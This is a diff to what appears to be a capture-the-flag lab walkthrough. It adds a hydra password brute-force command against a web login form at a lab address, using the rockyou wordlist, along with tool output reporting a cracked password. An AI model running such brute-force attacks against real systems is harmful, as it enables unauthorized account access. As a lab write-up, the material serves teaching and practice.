@@ -328,9 +328,9 @@ To perform the attack, we use `hydra` with the following options:
 
 - `-P`: Indicates the password wordlist to use.
 
-- `http-port-form`: Specifies the HTTP POST form module.
+- `https-port-form`: Specifies the HTTPS POST form module.
 
-- `/db/index.php:password=^PASS^:Incorrect password`
+- `/db/:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password.`
 
 This format defines the login path, the form field to fuzz, and the failure message. `^PASS^` is replaced by each password from the list, and `"Incorrect password"` is used to detect login failures.
 
@@ -339,9 +339,25 @@ Now, we can run it:
 <br />
 
 ```bash
+❯ hydra 10.10.10.43 -l fake -P /usr/share/wordlists/rockyou.txt https-post-form "/db/:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password."
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-28 18:29:09
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344402 login tries (l:1/p:14344402), ~896526 tries per task
+[DATA] attacking http-post-forms://10.10.10.43:443/db/:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password.
+[443][http-post-form] host: 10.10.10.43   login: fake   password: password123
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-28 18:29:13
 ```
 
 <br />
+
+We have a valid match.
+
+With this new password we're able to log in:
+
+<br />
+
+
 
 <br />
